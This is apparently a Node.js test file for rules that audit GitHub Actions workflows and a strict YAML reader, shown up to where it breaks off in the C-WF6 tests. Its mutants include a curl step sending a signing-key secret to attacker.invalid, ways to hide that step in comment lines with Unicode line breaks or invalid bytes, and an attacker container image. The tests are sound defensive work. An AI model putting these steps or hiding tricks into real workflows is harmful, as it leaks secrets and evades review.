// Static tests of the three workflows (plan task 1.8, rules C-WF1 to C-WF12) and of the strict YAML reader they are read with.
// Every rule passes on this repository's own .github/workflows, and every rule is shown failing on a copy broken one way per case
// (a mutant), so each failing case proves that its rule sees exactly that change. Nothing here runs a workflow, a network request or
// a tool of task 1.7; the rules read the files only.
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { after, describe, test } from 'node:test';
import { fileURLToPath } from 'node:url';
import { YamlSubsetError, parseYaml } from '../lib/yamlsub.mjs';
import { GUARD_STEP, MAIN_HEAD_STEP, RULES, UPLOAD_IF, VERIFY_IF, expr, jobLines, loadWorkflows } from '../lib/wfrules.mjs';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..', '..');
const WF_DIR = path.join(ROOT, '.github', 'workflows');

const temps = [];
after(() => { for (const t of temps) fs.rmSync(t, { recursive: true, force: true }); });
const tempDir = () => { const t = fs.mkdtempSync(path.join(os.tmpdir(), 'wf-test-')); temps.push(t); return t; };

const real = loadWorkflows(ROOT);

// The canonical steps, as text, so the mutants above can remove them from one job.
const GUARD_TEXT = stepText(GUARD_STEP);
const MAIN_HEAD_TEXT = stepText(MAIN_HEAD_STEP);
function stepText(step) {
  return [`      - name: ${step.name}`, '        run: |', ...step.run.replace(/\n$/, '').split('\n').map((l) => `          ${l}`), '', ''].join('\n');
}

/**
 * A copy of the workflows and the tool sources (tools/*.mjs, tools/lib/*.mjs) with `edits` applied, loaded like the real ones. An edit is { file, from, to } on a workflow (the text must occur exactly once, or at least once with `all`),
 * { file, job, from, to } (the same, inside one job's lines only), { path, from, to } on a repository path, or { file | path, text }
 * (writes the whole file; null deletes it).
 */
function mutant(edits) {
  const t = tempDir();
  const dir = path.join(t, '.github', 'workflows');
  fs.mkdirSync(dir, { recursive: true });
  for (const f of fs.readdirSync(WF_DIR)) fs.copyFileSync(path.join(WF_DIR, f), path.join(dir, f));
  for (const sub of ['tools', 'tools/lib']) {
    fs.mkdirSync(path.join(t, sub), { recursive: true });
    for (const f of fs.readdirSync(path.join(ROOT, sub))) {
      if (f.endsWith('.mjs')) fs.copyFileSync(path.join(ROOT, sub, f), path.join(t, sub, f));
    }
  }
  for (const e of edits) {
    const p = e.path ? path.join(t, e.path) : path.join(dir, e.file);
    if ('text' in e) {
      if (e.text === null) fs.rmSync(p);
      else { fs.mkdirSync(path.dirname(p), { recursive: true }); fs.writeFileSync(p, e.text); }
      continue;
    }
    const src = fs.readFileSync(p, 'utf8');
    let lo = 0;
    let hi = src.length;
    if (e.job) {
      const r = jobLines(src, e.job);
      assert.ok(r, `mutant: ${e.file} has no job ${e.job}`);
      const lines = src.split('\n');
      lo = lines.slice(0, r.start).join('\n').length + (r.start > 0 ? 1 : 0);
      hi = lo + lines.slice(r.start, r.end + 1).join('\n').length;
    }
    const part = src.slice(lo, hi);
    const n = part.split(e.from).length - 1;
    assert.ok(n >= 1, `mutant: ${e.file ?? e.path}${e.job ? ` job ${e.job}` : ''} does not contain ${JSON.stringify(e.from)}`);
    if (!e.all) assert.equal(n, 1, `mutant: ${e.file ?? e.path} contains ${JSON.stringify(e.from)} ${n} times`);
    const next = e.all ? part.split(e.from).join(e.to) : part.replace(e.from, () => e.to);
    fs.writeFileSync(p, src.slice(0, lo) + next + src.slice(hi));
  }
  return loadWorkflows(t);
}

/** The rule passes on the real workflows and reports a problem matching `re` on the mutant (each of them, for a list). */
function refuses(rule, edits, re) {
  assert.deepEqual(RULES[rule](real), [], `${rule} passes on the real workflows`);
  const problems = RULES[rule](mutant(edits));
  for (const r of [re].flat()) assert.ok(problems.some((p) => r.test(p)), `${rule}: expected a problem matching ${r}, got ${JSON.stringify(problems)}`);
}

// A step that hands the index key to the network, in both sign jobs alike: the change C-WF7's step pins exist for.
const CURL_STEP = '      - name: Report\n        env:\n          K: ${{ secrets.MINISIGN_INDEX_KEY }}\n        run: curl -d "$K" https://attacker.invalid/\n';
const MINISIGN_STEP = "      - name: Install minisign (Ubuntu's package)\n";

describe('YS: the strict YAML subset reader', () => {
  const bad = (src, re) => assert.throws(() => parseYaml(src), (e) => e instanceof YamlSubsetError && re.test(e.message));

  test('YS-values: mappings, sequences, scalars, flow sequences and literal blocks', () => {
    const { value } = parseYaml([
      '# a comment',
      'on:',
      '  workflow_dispatch:',
      'a: plain value # comment',
      "b: 'it''s'",
      'c: "say \\"hi\\" \\\\"',
      'd: [build, sign, sign-test]',
      'e: []',
      'f: ${{ x == \'y\' }}',
      'g: |',
      '  line 1',
      '',
      '    line 2 # not a comment',
      'h: |-',
      '  no newline',
      'i:',
      '  - one',
      '  - k: v',
      '    l: w',
      '  -   m: deeper',
      'j: a#b',
      '',
    ].join('\n'));
    assert.deepEqual(JSON.parse(JSON.stringify(value)), {
      on: { workflow_dispatch: null },
      a: 'plain value', b: "it's", c: 'say "hi" \\', d: ['build', 'sign', 'sign-test'], e: [], f: "${{ x == 'y' }}",
      g: 'line 1\n\n  line 2 # not a comment\n', h: 'no newline', i: ['one', { k: 'v', l: 'w' }, { m: 'deeper' }], j: 'a#b',
    });
  });

  test('YS-spans: the raw lines of a nested block', () => {
    const src = 'jobs:\n  a:\n    steps:\n      - run: x\n      - run: |\n          y\n  b:\n    steps: []\n';
    const { value, spans, lines } = parseYaml(src);
    const s = spans.get(value.jobs.a.steps);
    assert.deepEqual(lines.slice(s.start, s.end + 1), ['      - run: x', '      - run: |', '          y']);
    assert.deepEqual(jobLines(src, 'b'), { start: 7, end: 7 });
  });

  test('YS-refuses what it does not read the way GitHub does', () => {
    bad('a: &x 1\n', /anchor|alias|tag|indicator/);
    bad('a: *x\n', /anchor|alias|tag|indicator/);
    bad('a: !!str x\n', /anchor|alias|tag|indicator/);
    bad('a: {b: 1}\n', /flow mapping|indicator/);
    bad('a:\n\tb: 1\n', /tab/);
    bad('a: 1\na: 2\n', /duplicate key a/);
    bad('a: one\n  two\n', /indentation/);
    bad('a: >\n  folded\n', /folded|indicator/);
    bad('---\na: 1\n', /document|key/);
    bad('a:\n- x\n', /sequence item/);
    bad("a: 'open\n", /unterminated/);
    bad('a: "\\n"\n', /escape/);
    bad('a: |+\n  x\n', /block scalar header/);
    bad('a:value\n', /key: value/);
    bad('a: b: c\n', /": "/);
    bad('a: [x, {y}]\n', /flow sequence/);
    bad('a: |\n    x\n  y\n', /less indented/);
    bad('a: 1\r\n', /carriage return/);
    bad('- a\n', /mapping/);
  });

  // YAML 1.1 readers (YamlDotNet's IsBreak among them) take these three as line breaks and this reader would not, so a step written
  // after one inside a comment line would be hidden from the rules and read as a step by such a reader. They are refused on any
  // line, whatever GitHub's reader does with them.
  for (const [u, c] of [['U+0085', '\u0085'], ['U+2028', '\u2028'], ['U+2029', '\u2029']]) {
    test(`YAML ${u} is refused on any line`, () => {
      const at = (n) => new RegExp(`^line ${n}: ${u.replace('+', '\\+')}`);
      bad(`a: x${c}y\n`, at(1));
      bad(`a: 1\n# note${c}b: 2\n`, at(2));
      bad(`a: |\n  x\n  y${c}\n`, at(3));
      bad(`a: 1\nb: 2${c}`, at(2));
    });
  }

  test('YAML a secret step hidden after U+2028 in a comment line of both sign jobs fails every rule', () => {
    const hidden = `      # note\u2028${CURL_STEP.replace(/\n(?=.)/g, '\u2028')}`;
    const ws = mutant(['publish.yml', 'resign.yml'].map((file) => ({ file, job: 'sign', from: MINISIGN_STEP, to: hidden + MINISIGN_STEP })));
    for (const [rule, fn] of Object.entries(RULES)) {
      const problems = fn(ws);
      for (const f of ['publish.yml', 'resign.yml']) {
        assert.ok(problems.some((p) => new RegExp(`^${f.replace('.', '\\.')}: line \\d+: U\\+2028`).test(p)), `${rule} reports the U+2028 in ${f}: ${JSON.stringify(problems)}`);
      }
    }
  });

  // libyaml refuses the C0 controls (but tab, LF, CR) and DEL, the C1 controls, U+FFFE and U+FFFF; a reader that skips them hides text
  // in a comment line from this one. They are refused on any line.
  for (const [u, c] of [['U+0000', '\u0000'], ['U+0008', '\u0008'], ['U+000B', '\u000b'], ['U+000C', '\u000c'], ['U+001F', '\u001f'], ['U+007F', '\u007f'], ['U+009F', '\u009f'], ['U+FFFE', '\ufffe'], ['U+FFFF', '\uffff']]) {
    test(`YAML control character ${u} is refused on any line`, () => {
      bad(`a: 1\n# x${c}y\n`, /^line 2: a control character/);
      bad(`a: x${c}y\n`, /^line 1: a control character/);
    });
  }

  test('YAML a NUL in a comment line before publish.yml sign\'s if: is refused by the reader', () => {
    const ws = mutant([{ file: 'publish.yml', job: 'sign', from: "    if: ${{ inputs.target == 'production' }}\n", to: "    # x\u0000\n    if: ${{ inputs.target == 'production' }}\n" }]);
    for (const [rule, fn] of Object.entries(RULES)) {
      assert.ok(fn(ws).some((p) => /^publish\.yml: line \d+: a control character/.test(p)), `${rule} reports the NUL`);
    }
  });

  // A literal block line is blank only when it holds spaces alone. JavaScript's trim() also strips U+00A0, U+3000, U+2000 to U+200A
  // and U+FEFF, which YAML reads as text, so such a line would be a blank line of the block here and text outside it to GitHub.
  const UNICODE_SPACES = ['\u00a0', '\u3000', ...Array.from({ length: 11 }, (_, k) => String.fromCharCode(0x2000 + k))];
  test('YS a literal block line of Unicode spaces other than U+0020 is not blank', () => {
    for (const c of UNICODE_SPACES) {
      bad(`a: |\n  x\n${c}\n  y\n`, /^line 3: not a "key: value" line/);
      bad(`a: |\n    x\n  ${c}\n`, /^line 3: a block scalar line less indented than its first line/);
    }
    assert.equal(parseYaml('a: |\n  x\n  \n\n  y\n').value.a, 'x\n\n\ny\n');
  });

  // Inside a literal block a line of spaces is blank only up to the block's indentation: the spaces beyond it are text, as they are
  // to YAML (PyYAML and libyaml read 'a: |-\n  x\n     \n' as 'x\n   '). Read as blank, a |- if would hold its pin here and be
  // format('{0}\n   ', ...) to GitHub, always true. A leading blank line wider than the block's first line is an error to YAML.
  test('YS a literal block line of spaces beyond the block indentation is text, kept as YAML keeps it', () => {
    assert.equal(parseYaml('a: |-\n  x\n     \n').value.a, 'x\n   ');
    assert.equal(parseYaml('a: |\n  x\n     \n').value.a, 'x\n   \n');
    assert.equal(parseYaml('a: |\n  x\n     \n  y\n').value.a, 'x\n   \ny\n');
    assert.equal(parseYaml('a: |\n    x\n     \n').value.a, 'x\n \n');
    assert.deepEqual(JSON.parse(JSON.stringify(parseYaml('a: |-\n  x\n     \nb: 1\n').value)), { a: 'x\n   ', b: '1' });
    assert.equal(parseYaml('a: |\n  \n  x\n').value.a, '\nx\n', 'a leading blank line no wider than the first line is blank');
    assert.deepEqual(jobLines('jobs:\n  a:\n    if: |-\n      x\n      \n  b:\n    c: 1\n', 'a'), { start: 2, end: 3 }, 'a blank line is no part of the job');
    assert.deepEqual(jobLines('jobs:\n  a:\n    if: |-\n      x\n         \n  b:\n    c: 1\n', 'a'), { start: 2, end: 4 }, 'a line of text is');
    bad('a: |\n     \n  x\n', /^line 2: a leading blank line of a block scalar wider than its first line/);
    bad('jobs:\n  a:\n    if: |-\n          \n      ${{ x }}\n    b: 1\n', /^line 4: a leading blank line of a block scalar wider than its first line/);
  });

  // A flow sequence item loses its U+0020 spaces only: YAML reads 'a: [\u00a0build]' as ['\u00a0build'], so trim() would read a
  // needs, a branch filter or a choice's options other than GitHub does.
  test('YS a flow sequence item with a Unicode space other than U+0020 is refused, never trimmed', () => {
    for (const c of UNICODE_SPACES) {
      bad(`a: [${c}build]\n`, /^line 1: a flow sequence item that is not a plain word/);
      bad(`a: [build, sign${c}]\n`, /^line 1: a flow sequence item that is not a plain word/);
    }
    assert.deepEqual(parseYaml('a: [ build ,  sign ]\n').value.a, ['build', 'sign']);
  });

  test('YS U+FEFF is refused on any line, not only at the start', () => {
    bad('\ufeffa: 1\n', /^line 1: a byte order mark/);
    bad('a: 1\nb: x\ufeffy\n', /^line 2: a byte order mark/);
    bad('a: |\n  x\n\ufeff\n  y\n', /^line 3: a byte order mark/);
  });

  // Read without the fatal flag, a raw 0x85 byte (NEL to a Latin-1 reader) becomes U+FFFD and escapes the line-break check above.
  test('YAML a workflow that is not valid UTF-8 fails every rule', () => {
    const MARK = '@@0x85@@';
    const hidden = `      # note${MARK}${CURL_STEP.replace(/\n(?=.)/g, MARK)}`;
    const { root } = mutant(['publish.yml', 'resign.yml'].map((file) => ({ file, job: 'sign', from: MINISIGN_STEP, to: hidden + MINISIGN_STEP })));
    for (const f of ['publish.yml', 'resign.yml']) {
      const p = path.join(root, '.github', 'workflows', f);
      const parts = fs.readFileSync(p, 'utf8').split(MARK).map((s) => Buffer.from(s, 'utf8'));
      fs.writeFileSync(p, Buffer.concat(parts.flatMap((b, k) => (k === 0 ? [b] : [Buffer.from([0x85]), b]))));
    }
    const ws = loadWorkflows(root);
    for (const [rule, fn] of Object.entries(RULES)) {
      const problems = fn(ws);
      for (const f of ['publish.yml', 'resign.yml']) assert.ok(problems.some((p) => p.startsWith(`${f}: not valid UTF-8`)), `${rule} reports ${f}: ${JSON.stringify(problems)}`);
    }
  });

  test('YAML a workflow read from disk keeps its leading byte order mark, so every rule refuses it', () => {
    const ws = mutant([{ file: 'check.yml', text: `\ufeff${fs.readFileSync(path.join(WF_DIR, 'check.yml'), 'utf8')}` }]);
    for (const [rule, fn] of Object.entries(RULES)) assert.ok(fn(ws).some((p) => /^check\.yml: line 1: a byte order mark/.test(p)), rule);
  });
});

describe('expr: an if as GitHub reads it', () => {
  test('expr is the expression of exactly one ${{ }} with nothing outside it, and null for anything else', () => {
    assert.equal(expr("${{ a == 'b' }}"), "a == 'b'");
    assert.equal(expr('${{  a\n  &&  b }}'), 'a && b');
    assert.equal(expr('!cancelled()  && b'), '!cancelled() && b', 'without ${{ GitHub reads the whole value as an expression');
    assert.equal(expr("${{ 'x }}' }}"), "'x }}'", 'a }} inside quotes does not end the expression');
    assert.equal(expr("${{ 'it''s }}' }}"), "'it''s }}'");
    for (const v of ['${{ a }} ', ' ${{ a }}', '${{ a }}\n', '${{ a }} && ${{ b }}', '${{ a }}${{ b }}', '${{ a }}}', '${{ a', '${{ }}', "${{ 'a }}"]) {
      assert.equal(expr(v), null, JSON.stringify(v));
    }
  });
});

describe('C-WF1 triggers', () => {
  test('C-WF1 the real workflows pass', () => assert.deepEqual(RULES['C-WF1'](real), []));
  test('C-WF1 refuses pull_request_target', () => refuses('C-WF1', [{ file: 'check.yml', from: '\n  pull_request:\n', to: '\n  pull_request_target:\n' }], /pull_request_target/));
  test('C-WF1 refuses an added workflow_run trigger', () => refuses('C-WF1', [{ file: 'publish.yml', from: '\non:\n', to: '\non:\n  workflow_run:\n    workflows: [check]\n' }], /workflow_run/));
  test('C-WF1 refuses issue_comment written as a list', () => refuses('C-WF1', [{ file: 'check.yml', from: '\non:\n  pull_request:\n    branches: [main]\n', to: '\non: [pull_request, issue_comment]\n' }], /issue_comment/));
  test('C-WF1 reads a # after a Unicode space as text, as YAML does (no comment hides a trigger name)', () => refuses('C-WF1', [{ file: 'check.yml', from: '\npermissions:\n', to: '\nx: y\u00a0#pull_request_target\npermissions:\n' }], /^check\.yml: names pull_request_target/));
  test('C-WF1 refuses a fourth workflow file', () => refuses('C-WF1', [{ file: 'extra.yml', text: 'name: x\non: push\npermissions:\n  actions: write\njobs: {}\n' }], /extra\.yml/));
  test('C-WF1 refuses resign.yml without its schedule', () => refuses('C-WF1', [{ file: 'resign.yml', from: "  schedule:\n    - cron: '17 6 * * 1'\n", to: '' }], /resign\.yml: triggers/));
});

describe('C-WF2 actions pinned by full SHA', () => {
  test('C-WF2 the real workflows pass', () => assert.deepEqual(RULES['C-WF2'](real), []));
  test('C-WF2 refuses a tag', () => refuses('C-WF2', [{ file: 'check.yml', job: 'checks', from: '@3d3c42e5aac5ba805825da76410c181273ba90b1', to: '@v7' }], /not pinned/));
  test('C-WF2 refuses a short SHA', () => refuses('C-WF2', [{ file: 'resign.yml', job: 'check', from: '@3d3c42e5aac5ba805825da76410c181273ba90b1', to: '@3d3c42e' }], /not pinned/));
  test('C-WF2 refuses upper-case hex', () => refuses('C-WF2', [{ file: 'publish.yml', job: 'sign', from: 'actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9', to: 'actions/upload-artifact@CF430E030DDBB5B0ABF93D22962F4752F3646CD9' }], /not pinned/));
  test('C-WF2 refuses a local action', () => refuses('C-WF2', [{ file: 'check.yml', job: 'checks', from: 'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1', to: './.github/actions/checkout' }], /not pinned/));
  test('C-WF2 refuses a docker image', () => refuses('C-WF2', [{ file: 'check.yml', job: 'checks', from: 'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1', to: 'docker://alpine:3' }], /not pinned/));
  test('C-WF2 refuses a uses: the structure did not see', () => refuses('C-WF2', [{ file: 'check.yml', from: '\njobs:\n', to: '\nx: |\n  uses: a/b@v1\njobs:\n' }], /uses: lines/));
  test('C-WF2 refuses a placeholder instead of a SHA', () => refuses('C-WF2', [{ file: 'check.yml', job: 'checks', from: '@3d3c42e5aac5ba805825da76410c181273ba90b1', to: '@TODO-PIN' }], /check\.yml job checks step \d+: uses "actions\/checkout@TODO-PIN" is not pinned/));
  test('C-WF2 refuses a pin without its release tag comment', () => refuses('C-WF2', [{ file: 'publish.yml', job: 'build', from: 'actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0', to: 'actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1' }], /publish\.yml line \d+: a uses: line must be written/));
  test('C-WF2 refuses a comment that is not a release tag', () => refuses('C-WF2', [{ file: 'resign.yml', job: 'upload', from: 'actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2', to: 'actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8', all: true }], /resign\.yml line \d+: a uses: line must be written/));
  test('C-WF2 refuses one action pinned to two commits', () => refuses('C-WF2', [{ file: 'resign.yml', job: 'verify', from: 'actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1', to: 'actions/setup-node@249970729cb0ef3589644e2896645e5dc5ba9c38' }], /actions\/setup-node is pinned 2 ways/));
  test('C-WF2 refuses one commit under two tags', () => refuses('C-WF2', [{ file: 'check.yml', job: 'checks', from: '@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1', to: '@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.0' }], /actions\/checkout is pinned 2 ways/));
});

describe('C-WF3 no expressions inside run', () => {
  test('C-WF3 the real workflows pass', () => assert.deepEqual(RULES['C-WF3'](real), []));
  test('C-WF3 refuses an input inside run', () => refuses('C-WF3', [{ file: 'publish.yml', from: '          printf \'%s\\n\' "$LIFT"', to: '          printf \'%s\\n\' "${{ inputs.lift }}"' }], /publish\.yml job build step \d+: run holds an expression/));
  test('C-WF3 refuses event data inside run', () => refuses('C-WF3', [{ file: 'check.yml', job: 'review', from: '--author "$PR_AUTHOR"', to: '--author "${{ github.event.pull_request.user.login }}"' }], /check\.yml job review/));
});

describe('C-WF4 no lifetime override', () => {
  test('C-WF4 the real workflows pass', () => assert.deepEqual(RULES['C-WF4'](real), []));
  test('C-WF4 refuses --lifetime-days', () => refuses('C-WF4', [{ file: 'resign.yml', from: 'tools/build-index.mjs resign ', to: 'tools/build-index.mjs resign --lifetime-days 30 ' }], /lifetime-days/));
});

describe('C-WF5 secrets, variables and permissions', () => {
  test('C-WF5 the real workflows pass', () => assert.deepEqual(RULES['C-WF5'](real), []));
  test('C-WF5 refuses an index secret outside environment index', () => refuses('C-WF5', [{ file: 'publish.yml', job: 'build', from: '      TARGET: ${{ inputs.target }}\n', to: '      TARGET: ${{ inputs.target }}\n      K: ${{ secrets.MINISIGN_INDEX_KEY }}\n' }], /job build: secret MINISIGN_INDEX_KEY/));
  test('C-WF5 refuses an R2 secret outside environment mirror', () => refuses('C-WF5', [{ file: 'resign.yml', job: 'verify', from: '    steps:\n', to: '    env:\n      R: ${{ secrets.R2_SECRET_ACCESS_KEY }}\n    steps:\n' }], /job verify: secret R2_SECRET_ACCESS_KEY/));
  test('C-WF5 refuses an R2 secret in the index job', () => refuses('C-WF5', [{ file: 'resign.yml', job: 'sign', from: '      HEAD_COMMENT: ${{ needs.head.outputs.head_comment }}\n', to: '      HEAD_COMMENT: ${{ needs.head.outputs.head_comment }}\n      R: ${{ secrets.R2_ACCESS_KEY_ID }}\n' }], /job sign: secret R2_ACCESS_KEY_ID/));
  test('C-WF5 refuses a secret this repository does not name', () => refuses('C-WF5', [{ file: 'publish.yml', job: 'upload', from: '          GH_TOKEN: ${{ github.token }}\n', to: '          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n' }], /secret GITHUB_TOKEN/));
  test('C-WF5 refuses toJSON(secrets)', () => refuses('C-WF5', [{ file: 'publish.yml', job: 'sign', from: '      HEAD_SHA256: ${{ needs.build.outputs.head_sha256 }}\n', to: '      HEAD_SHA256: ${{ needs.build.outputs.head_sha256 }}\n      ALL: ${{ toJSON( secrets ) }}\n' }], /toJSON\(secrets\)/));
  test('C-WF5 refuses secrets: inherit', () => refuses('C-WF5', [{ file: 'resign.yml', from: '\n  verify:\n', to: '\n  other:\n    uses: eve-cyno/plugins/.github/workflows/x.yml@0123456789012345678901234567890123456789\n    secrets: inherit\n  verify:\n' }], /secrets: inherit/));
  test('C-WF5 refuses a secret at workflow level', () => refuses('C-WF5', [{ file: 'resign.yml', from: '\npermissions:\n', to: '\nenv:\n  K: ${{ secrets.MINISIGN_INDEX_KEY }}\npermissions:\n' }], /outside the jobs/));
  test('C-WF5 refuses contents: write', () => refuses('C-WF5', [{ file: 'publish.yml', job: 'upload', from: '      contents: read\n', to: '      contents: write\n' }], /job upload: permissions/));
  test('C-WF5 refuses actions: read on the sign job', () => refuses('C-WF5', [{ file: 'publish.yml', job: 'sign', from: '      contents: read\n', to: '      contents: read\n      actions: read\n' }], /job sign: permissions/));
  test('C-WF5 refuses actions: read on resign.yml upload', () => refuses('C-WF5', [{ file: 'resign.yml', job: 'upload', from: '      contents: read\n', to: '      contents: read\n      actions: read\n' }], /resign\.yml job upload: permissions/));
  test('C-WF5 refuses a job without permissions', () => refuses('C-WF5', [{ file: 'check.yml', job: 'review', from: '    permissions:\n      contents: read\n', to: '' }], /job review: permissions/));
  test('C-WF5 refuses write-all at workflow level', () => refuses('C-WF5', [{ file: 'check.yml', from: '\npermissions:\n  contents: read\n', to: '\npermissions: write-all\n' }], /workflow permissions/));
  test('C-WF5 refuses an environment on another job', () => refuses('C-WF5', [{ file: 'publish.yml', job: 'build', from: '    timeout-minutes: 120\n', to: '    timeout-minutes: 120\n    environment: index\n' }], /job build: environment/));
  test('C-WF5 refuses a mirror variable outside mirror', () => refuses('C-WF5', [{ file: 'publish.yml', job: 'verify', from: '      TARGET: ${{ inputs.target }}\n', to: '      TARGET: ${{ inputs.target }}\n      B: ${{ vars.R2_BUCKET }}\n' }], /job verify: variable R2_BUCKET/));
  test('C-WF5 refuses another variable', () => refuses('C-WF5', [{ file: 'publish.yml', job: 'upload', from: '          R2_BUCKET: ${{ vars.R2_BUCKET }}\n', to: '          R2_BUCKET: ${{ vars.OTHER }}\n' }], /variable OTHER/));
  test('C-WF5 refuses bracket access to secrets', () => refuses('C-WF5', [{ file: 'publish.yml', job: 'sign', from: '${{ secrets.MINISIGN_INDEX_KEY }}', to: "${{ secrets['MINISIGN_INDEX_KEY'] }}" }], /secrets\[/));
  test('C-WF5 refuses a container on a job', () => refuses('C-WF5', [{ file: 'publish.yml', job: 'upload', from: '    environment: mirror\n', to: '    environment: mirror\n    container: ghcr.io/attacker/image:latest\n' }], /^publish\.yml job upload: container/));
  test('C-WF5 refuses services on a job', () => refuses('C-WF5', [{ file: 'publish.yml', job: 'upload', from: '    environment: mirror\n', to: '    environment: mirror\n    services:\n      x:\n        image: ghcr.io/attacker/image:latest\n' }], /^publish\.yml job upload: services/));
  test('C-WF5 refuses a self-hosted runner', () => refuses('C-WF5', [{ file: 'publish.yml', job: 'upload', from: '    runs-on: ubuntu-24.04\n', to: '    runs-on: self-hosted\n' }], /^publish\.yml job upload: runs-on "self-hosted", expected ubuntu-24\.04/));
  test('C-WF5 refuses a runner list', () => refuses('C-WF5', [{ file: 'check.yml', job: 'review', from: '    runs-on: ubuntu-24.04\n', to: '    runs-on: [ubuntu-24.04, self-hosted]\n' }], /^check\.yml job review: runs-on/));
  test('C-WF5 refuses env at workflow level', () => refuses('C-WF5', [{ file: 'publish.yml', from: '\nconcurrency:\n', to: '\nenv:\n  NODE_OPTIONS: --require=/tmp/x.js\nconcurrency:\n' }], /^publish\.yml: env at workflow level/));
});

// GitHub reads a context name in any case (Secrets, VARS, toJson), skips whitespace between the tokens of an expression and ends an
// expression at its first }} outside single quotes; an if written without ${{ is an expression too. Each mutant reads a secret or a
// variable in one of those spellings, where the lower-case, ${{ }} spelling is refused.
describe('C-WF5 reads secrets and vars in every spelling GitHub reads', () => {
  const build = (line) => ({ file: 'publish.yml', job: 'build', from: '      TARGET: ${{ inputs.target }}\n', to: `      TARGET: \${{ inputs.target }}\n      ${line}\n` });
  test('C-WF5 refuses a mixed-case secret outside its environment', () => refuses('C-WF5', [build('K: ${{ Secrets.MINISIGN_INDEX_KEY }}')], /^publish\.yml job build: secret MINISIGN_INDEX_KEY belongs only in a job with environment index$/));
  test('C-WF5 refuses an upper-case secret this repository does not name', () => refuses('C-WF5', [{ file: 'publish.yml', job: 'upload', from: '          GH_TOKEN: ${{ github.token }}\n', to: '          GH_TOKEN: ${{ SECRETS.GITHUB_TOKEN }}\n' }], /^publish\.yml job upload: secret GITHUB_TOKEN is not one this repository names$/));
  test('C-WF5 refuses a secret named like an Object property as one this repository does not name', () => refuses('C-WF5', [{ file: 'publish.yml', job: 'upload', from: '          GH_TOKEN: ${{ github.token }}\n', to: '          GH_TOKEN: ${{ secrets.constructor }}\n' }], /^publish\.yml job upload: secret constructor is not one this repository names$/));
  test('C-WF5 refuses a mixed-case variable outside mirror', () => refuses('C-WF5', [{ file: 'publish.yml', job: 'verify', from: '      TARGET: ${{ inputs.target }}\n', to: '      TARGET: ${{ inputs.target }}\n      B: ${{ Vars.R2_BUCKET }}\n' }], /^publish\.yml job verify: variable R2_BUCKET belongs only in a job with environment mirror$/));
  test('C-WF5 refuses an upper-case variable this repository does not name', () => refuses('C-WF5', [{ file: 'publish.yml', job: 'upload', from: '          R2_BUCKET: ${{ vars.R2_BUCKET }}\n', to: '          R2_BUCKET: ${{ VARS.OTHER }}\n' }], /^publish\.yml job upload: variable OTHER is not one this repository names$/));
  test('C-WF5 refuses the whole secrets context in mixed case', () => refuses('C-WF5', [build('ALL: ${{ Secrets }}')], /^publish\.yml job build: the whole secrets context/));
  test('C-WF5 refuses toJSON(vars) in any case and spacing', () => refuses('C-WF5', [build('ALL: ${{ ToJson ( Vars ) }}')], [/^publish\.yml: toJSON\(vars\)$/, /^publish\.yml job build: the whole vars context/]));
  test('C-WF5 refuses toJSON(secrets) in upper case, whole context included', () => refuses('C-WF5', [build('ALL: ${{ TOJSON(SECRETS) }}')], [/^publish\.yml: toJSON\(secrets\)$/, /^publish\.yml job build: the whole secrets context/]));
  test('C-WF5 refuses fromJSON over a context', () => refuses('C-WF5', [build('ALL: ${{ FromJSON( secrets ) }}')], /^publish\.yml: fromJSON\(secrets\)$/));
  test('C-WF5 refuses secrets.* (every value of the context)', () => refuses('C-WF5', [build("ALL: ${{ join(secrets.*, ',') }}")], /^publish\.yml job build: the whole secrets context/));
  test('C-WF5 refuses vars.* in mixed case', () => refuses('C-WF5', [build("ALL: ${{ join(Vars.*, ',') }}")], /^publish\.yml job build: the whole vars context/));
  test('C-WF5 refuses mixed-case bracket access to secrets', () => refuses('C-WF5', [{ file: 'publish.yml', job: 'sign', from: '${{ secrets.MINISIGN_INDEX_KEY }}', to: "${{ Secrets['MINISIGN_INDEX_KEY'] }}" }], [/^publish\.yml: secrets\[\.\.\.\]/, /^publish\.yml job sign: the whole secrets context/]));
  test('C-WF5 refuses bracket access to vars', () => refuses('C-WF5', [{ file: 'publish.yml', job: 'upload', from: '${{ vars.R2_BUCKET }}', to: "${{ vars [ 'R2_BUCKET' ] }}" }], /^publish\.yml: vars\[\.\.\.\]/));
  test('C-WF5 refuses a mixed-case context with a spaced dot', () => refuses('C-WF5', [build('K: ${{ Secrets . MINISIGN_INDEX_KEY }}')], /^publish\.yml job build: the whole secrets context/));
  test('C-WF5 refuses a mixed-case secret at workflow level', () => refuses('C-WF5', [{ file: 'resign.yml', from: '\npermissions:\n', to: '\nenv:\n  K: ${{ Secrets.MINISIGN_INDEX_KEY }}\npermissions:\n' }], /^resign\.yml: a secret or variable outside the jobs/));
  test('C-WF5 reads an expression to its first }} outside quotes, as GitHub does', () => refuses('C-WF5', [build("K: ${{ format('}}{0}', secrets.MINISIGN_INDEX_KEY) }}")], /^publish\.yml job build: secret MINISIGN_INDEX_KEY belongs only in a job with environment index$/));
  test('C-WF5 reads a job if without ${{ as an expression', () => refuses('C-WF5', [{ file: 'check.yml', job: 'review', from: '    timeout-minutes: 30\n', to: "    timeout-minutes: 30\n    if: Vars.OTHER == 'x'\n" }], /^check\.yml job review: variable OTHER is not one this repository names$/));
  test('C-WF5 reads a step if without ${{ as an expression', () => refuses('C-WF5', [{ file: 'check.yml', job: 'review', from: '      - name: Set up Node\n', to: "      - name: Set up Node\n        if: vars.R2_BUCKET != ''\n" }], /^check\.yml job review: variable R2_BUCKET belongs only in a job with environment mirror$/));
});

describe('C-WF6 workflow-level concurrency', () => {
  test('C-WF6 the real workflows pass', () => assert.deepEqual(RULES['C-WF6'](real), []));
